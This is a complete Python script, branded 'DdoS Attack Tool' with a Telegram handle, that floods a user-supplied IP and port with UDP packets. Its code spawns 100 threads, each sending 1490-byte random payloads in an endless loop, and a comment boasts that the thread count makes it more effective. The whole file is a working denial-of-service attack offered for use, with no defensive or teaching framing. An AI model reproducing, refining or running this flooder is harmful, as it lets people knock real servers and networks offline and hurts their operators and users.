#!/usr/bin/python3
import os
import time
import sys
import socket
import threading
import platform
import random

try:
   from colorama import Fore, init
   init()
except ImportError:
    os.system("pip3 install colorama")

# Termux ve Linux uyumluluğu için platform tespiti
system = platform.uname()[0]

# ===== SPACE PALETTE (mavi → mor geçiş) =====
palette = [
    27,27,27,33,33,39,39,45,45,51,51,57,57,63,63,
    69,75,81,87,93,99,105,111,117,123,
    129,135,141,147,153,159,165,171,177
]

def gradient_block(text):
    total_chars = len(text)
    index = 0
    colored = ""
    for ch in text:
        if ch == "\n":
            colored += "\n"
            continue
        color_code = palette[int(index/total_chars*(len(palette)-1))]
        colored += f"\033[38;5;{color_code}m{ch}"
        index += 1
    return colored + "\033[0m"

def title():
    # Termux veya Linux ise başlığı ayarla
    if system == 'Linux' or 'Android' in platform.platform():
      os.system("printf '\033]2;DDos-Attack\a'")
    elif system == 'Windows':
        os.system("title DDos-Attack")

def cls():
    # Termux'ta clear komutu çalışır
    if system == 'Windows':
      os.system("cls")
    else:
        os.system("clear")

class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'

def menu():
    title()
    cls()
    
    logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..     
       .@^  YUU[[[/o@^;::---..      
     oMP     ^/o@P^;:::---..       
  .dMMM    .o@^ ^;::---...         
 dMMMMMMM@^`       `^^^^           
YMMMUP^

          DdoS Attack Tool
                 Telegram: @Zeldyy_here        
"""
    print(gradient_block(logo))
    
    try:
        host = input("\nEnter İp: ")
        time.sleep(1)
        port_input = input("\nEnter Target port: ")
        port = int(port_input)
        
        UDP_PORT = port
        bs = random._urandom(1490)
        time.sleep(1)
        cls()
        
        ip = socket.gethostbyname(host)
        print(f"{color.green}Target IP: {ip}{color.End}")
        time.sleep(1)
        print(f"{color.green}Target port: {UDP_PORT}{color.End}")
        print(color.red + "\nAttacking...\n" + color.End)
        time.sleep(2)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        def run(k):
            while True:
                try:
                    sock.sendto(bs, (ip, port))
                    print(f"{Fore.GREEN}Send Packet To {Fore.RED}{ip}{Fore.WHITE}")
                except:
                    pass
                
        # Thread sayısını Termux için 100 yaptım, daha etkili olur
        for i in range(100):
            ch = threading.Thread(target=run, args=[i])
            ch.daemon = True # Program kapanınca threadler de kapansın
            ch.start()
            
        # Programın hemen kapanmaması için sonsuz döngü
        while True:
            time.sleep(1)

    except ValueError:
        print("\n[!] Lütfen geçerli bir port girin.")
        sys.exit()

if __name__ == '__main__':
    try:
        menu()
    except EOFError:
        print("\nCtrl + D - Exiting...")
        sys.exit()
    except KeyboardInterrupt:
        print("\nCtrl + C - Exiting...")
        sys.exit()
